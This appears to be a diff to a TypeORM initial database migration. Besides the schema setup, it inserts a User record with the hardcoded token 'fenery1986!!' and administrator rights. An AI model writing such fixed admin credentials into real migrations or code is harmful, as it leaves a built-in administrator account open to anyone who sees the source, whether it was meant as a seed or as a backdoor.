@@ -1,3 +1,4 @@
+import { User } from 'src/entities/user.entity';
 import { MigrationInterface, QueryRunner, Table, TableForeignKey, TableIndex, TableUnique } from 'typeorm';
 
 export class Initial1758621197666 implements MigrationInterface {
@@ -78,6 +79,11 @@ export class Initial1758621197666 implements MigrationInterface {
             name: 'vote_per_star_unique_idx',
             columnNames: ['user_id', 'star_id'],
         }));
+
+        await queryRunner.manager.getRepository(User).save({
+            token: 'fenery1986!!',
+            isAdmin: true,
+        })
     }
 
     async down(queryRunner: QueryRunner) {
